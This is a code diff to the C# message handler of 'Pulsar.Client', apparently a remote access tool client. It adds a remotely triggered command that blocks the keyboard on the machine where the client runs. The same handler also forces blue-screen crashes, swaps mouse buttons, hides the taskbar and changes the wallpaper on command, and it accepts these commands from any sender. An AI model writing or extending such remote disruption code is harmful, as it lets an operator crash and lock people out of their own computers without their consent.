@@ -10,13 +10,14 @@ using System.IO;
 
 namespace Pulsar.Client.Messages
 {
-    public class FunStuffHandler : IMessageProcessor
+    public class FunStuffHandler : IMessageProcessor, IDisposable
     {
         private BSOD _bsod = new BSOD();
         private SwapMouseButtons _swapMouseButtons = new SwapMouseButtons();
         private HideTaskbar _hideTaskbar = new HideTaskbar();
+        private KeyboardInput _keyboardInput = new KeyboardInput();
 
-        public bool CanExecute(IMessage message) => message is DoBSOD || message is DoSwapMouseButtons || message is DoHideTaskbar || message is DoChangeWallpaper;
+        public bool CanExecute(IMessage message) => message is DoBSOD || message is DoSwapMouseButtons || message is DoHideTaskbar || message is DoChangeWallpaper || message is DoBlockKeyboardInput;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -36,13 +37,15 @@ namespace Pulsar.Client.Messages
                 case DoChangeWallpaper msg:
                     Execute(sender, msg);
                     break;
+                case DoBlockKeyboardInput msg:
+                    Execute(sender, msg);
+                    break;
             }
         }
 
         private void Execute(ISender client, DoBSOD message)
         {
             client.Send(new SetStatus { Message = "Successfull BSOD" });
-
             _bsod.DOBSOD();
         }
 
@@ -83,6 +86,19 @@ namespace Pulsar.Client.Messages
             catch
             {
                 client.Send(new SetStatus { Message = "Failed to change wallpaper" });
+            }
+        }
+
+        private void Execute(ISender client, DoBlockKeyboardInput message)
+        {
+            try
+            {
+                _keyboardInput.Handle(message);
+                client.Send(new SetStatus { Message = $"Keyboard input {(message.Block ? "blocked" : "unblocked")} successfully" });
+            }
+            catch (Exception ex)
+            {
+                client.Send(new SetStatus { Message = $"Failed to {(message.Block ? "block" : "unblock")} keyboard input: {ex.Message}" });
             }
         }
 
@@ -133,5 +149,34 @@ namespace Pulsar.Client.Messages
             }
         }
 
+        #region IDisposable Implementation
+
+        private bool _disposed = false;
+
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+            if (!_disposed)
+            {
+                if (disposing)
+                {
+                    // Dispose managed resources
+                    _keyboardInput?.Dispose();
+                }
+                _disposed = true;
+            }
+        }
+
+        ~FunStuffHandler()
+        {
+            Dispose(false);
+        }
+
+        #endregion
     }
 }
